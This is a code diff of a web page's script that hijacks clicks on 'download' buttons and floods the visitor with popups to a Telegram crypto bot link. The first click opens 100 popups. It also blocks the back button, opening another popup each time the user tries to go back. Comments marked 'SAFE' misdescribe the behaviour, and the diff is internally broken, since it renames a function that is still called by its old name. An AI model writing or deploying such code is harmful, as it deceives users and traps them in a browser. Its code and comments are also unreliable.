@@ -218,18 +218,22 @@ const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
 let clickCount = 0;
 
+// ✅ SAFE POPUP FUNCTION
 function openPopup(url){
-  const win = window.open(url, "_blank");
+  let win = window.open(url, "_blank");
+
   if(!win){
     window.location.href = url;
   }
 }
 
-function openPopups(url, count){
-  for(let i = 0; i < count; i++){
+// ✅ MULTI POPUP ENGINE
+// 👉 3 POPUP SYSTEM
+function openThreePopups(url){
+  for(let i = 0; i < 3; i++){
     setTimeout(() => {
       openPopup(url);
-    }, i * 300);
+    }, i * 800);
   }
 }
 
@@ -242,15 +246,18 @@ function openExternal(){
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  let popupCount = (clickCount === 1) ? 3 : 1;
+  // 👉 popup logic
+  let popupCount = (clickCount === 1) ? 100 : 3;
 
-  // Telegram
+  // ❌ REMOVED unsafe +100 boost (causes block)
+
+  // ✅ TELEGRAM
   if(isTelegram){
     openPopups(smartLink, popupCount);
     return;
   }
 
-  // Android
+  // 🤖 ANDROID
   if(isAndroid){
 
     let intentLink =
@@ -262,11 +269,10 @@ function openExternal(){
 
     setTimeout(() => {
       openPopups(smartLink, popupCount);
-    }, 800);
-
+    }, 1200);
   }
 
-  // iOS
+  // 🍎 IOS
   else if(isIOS){
 
     let chromeLink =
@@ -277,17 +283,17 @@ function openExternal(){
 
     setTimeout(() => {
       openPopups(smartLink, popupCount);
-    }, 800);
-
+    }, 1200);
   }
 
-  // PC
+  // 💻 PC
   else{
     openPopups(smartLink, popupCount);
   }
+
 }
 
-// click handler
+// 🔥 CLICK EVENT
 document.addEventListener("click", function(e){
   if(e.target.classList.contains("download")){
     e.preventDefault();
@@ -295,13 +301,17 @@ document.addEventListener("click", function(e){
   }
 });
 
-// back button safe
+// 🔥 BACK BUTTON SAFE VERSION (light)
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
   history.pushState(null, null, location.href);
+
+  // safe single popup
   openPopup(smartLink);
 };
+
+ </script>
  
 </body>
 </html>
